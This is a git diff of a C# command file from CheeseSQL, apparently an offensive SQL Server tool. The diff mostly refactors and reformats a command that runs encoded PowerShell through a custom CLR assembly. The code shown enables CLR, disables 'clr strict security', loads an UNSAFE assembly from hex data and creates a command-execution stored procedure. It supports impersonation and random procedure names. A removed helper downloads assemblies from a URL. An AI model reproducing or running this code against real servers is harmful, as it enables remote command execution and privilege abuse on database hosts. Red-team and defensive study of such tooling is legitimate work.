@@ -1,4 +1,5 @@
-﻿using System;
+﻿using CheeseSQL.Helpers;
+using System;
 using System.Collections.Generic;
 using System.Data.SqlClient;
 using System.IO;
@@ -14,12 +15,12 @@ namespace CheeseSQL.Commands
         public string Description()
         {
             return $"[*] {CommandName}\r\n" +
-    $"  Description: Execute Encoded PowerShell Command via custom CLR assembly";
+                   $"  Description: Execute Encoded PowerShell Command via custom CLR assembly";
         }
 
         public string Usage()
         {
-            return $"{Description()}\r\n  " + 
+            return $"{Description()}\r\n  " +
                 $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                 $"/db:DATABASE " +
                 $"/server:SERVER " +
@@ -30,51 +31,6 @@ namespace CheeseSQL.Commands
                 $"[/compile] " +
                 $"[/impersonate:USER] " +
                 $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
-        }
-
-        private static Random random = new Random();
-        public static string RandomString(int length)
-        {
-            string rs = "0";
-            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-            while (char.IsDigit(rs[0])) { 
-                rs = new string(Enumerable.Repeat(chars, length)
-                  .Select(s => s[random.Next(s.Length)]).ToArray());
-            }
-            return rs;
-        }
-
-        public static string ConvertByteToHex(byte[] byteData)
-        {
-            return BitConverter.ToString(byteData).Replace("-", "");
-        }
-
-        public static string LoadAssembly(string filename, string className=null, string methodName=null, bool compile=false)
-        {
-
-            byte[] byteData = new byte[] { };
-            if (compile)
-            {
-                byteData = Helpers.AssemblyCompiler.compileWithRoselyn(className, methodName, filename);
-            }
-            else if (File.Exists(filename))
-            {
-                byteData = File.ReadAllBytes(filename);
-            }
-            else if (filename.StartsWith("http"))
-            {
-                byteData = (new WebClient()).DownloadData(filename);
-            }
-            else if (filename.StartsWith("0x"))
-            {
-                return filename;
-            }
-            else
-            {
-                throw new FormatException();
-            }
-
-            return "0x" + BitConverter.ToString(byteData).Replace("-", "");
         }
 
         public void Execute(Dictionary<string, string> arguments)
@@ -146,7 +102,9 @@ namespace CheeseSQL.Commands
             {
                 Console.WriteLine("\r\n[X] You must supply an assembly name, path, url, or choose the `compile` option\r\n");
                 return;
-            } else if (String.IsNullOrEmpty(assembly) && compile) {
+            }
+            else if (String.IsNullOrEmpty(assembly) && compile)
+            {
                 assembly = Path.GetFileNameWithoutExtension(Path.GetTempFileName());
             }
             if (String.IsNullOrEmpty(cmd))
@@ -160,7 +118,7 @@ namespace CheeseSQL.Commands
             }
             if (String.IsNullOrEmpty(method))
             {
-                method = RandomString(10);
+                method = StringUtils.RandomString(10);
             }
 
             if (sqlauth)
@@ -208,7 +166,8 @@ namespace CheeseSQL.Commands
 
             Console.WriteLine("[*] Loading assembly..");
 
-            string hexData = LoadAssembly(assembly, clazz, method, compile);
+            string hash;
+            string hexData = AssemblyLoader.LoadAssembly(assembly, out hash, clazz, method, compile);
 
             if (!String.IsNullOrEmpty(impersonate))
             {
@@ -221,13 +180,13 @@ namespace CheeseSQL.Commands
             }
 
             Console.WriteLine("[*] Enabling CLR..");
-            string enableOle = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
-            command = new SqlCommand(enableOle, connection);
+            string enableCLR = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
+            command = new SqlCommand(enableCLR, connection);
             Console.WriteLine("[*] Disabling CLR Security..");
             reader = command.ExecuteReader();
             reader.Read();
             reader.Close();
-            
+
             Console.WriteLine("[*] Creating assembly {0}..", assembly);
 
             string execCmd = $"CREATE ASSEMBLY {assembly} FROM {hexData} WITH PERMISSION_SET = UNSAFE;";
@@ -235,7 +194,7 @@ namespace CheeseSQL.Commands
             reader = command.ExecuteReader();
             reader.Read();
             reader.Close();
-            
+
             Console.WriteLine("[*] Creating procedure [{0}].[{1}].[{2}]..", assembly, clazz, method);
 
             execCmd = $"CREATE PROCEDURE [dbo].[{method}] @command NVARCHAR (4000) AS EXTERNAL NAME [{assembly}].[{clazz}].[{method}];";
